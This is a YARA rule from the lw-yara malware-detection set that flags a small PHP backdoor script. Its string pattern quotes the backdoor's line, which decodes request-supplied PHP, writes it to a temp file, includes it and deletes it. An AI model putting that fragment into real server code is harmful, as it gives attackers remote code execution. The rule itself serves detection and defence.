rule infected_10_29_18_backdoors_script1 {
  meta:
    description = "backdoors - file script1"
    author      = "Brian Laskowski"
    reference   = "https://github.com/Hestat/lw-yara/"
    date        = "2018-10-28"
    hash1       = "032a86ba3060ecaa285e394913e1e1d36289db6cb56bc01c6cc116e5401daab3"

  strings:
    $s1 = "@file_put _contents('cleartemp','<?php '.base64_decode($_REQUEST['q'])); @include('cleartemp'); @unlink('cleartemp');" fullword ascii

  condition:
    (uint16(0) == 0x6640 and
      filesize < 1KB and
      (all of them)
    ) or (all of them)
}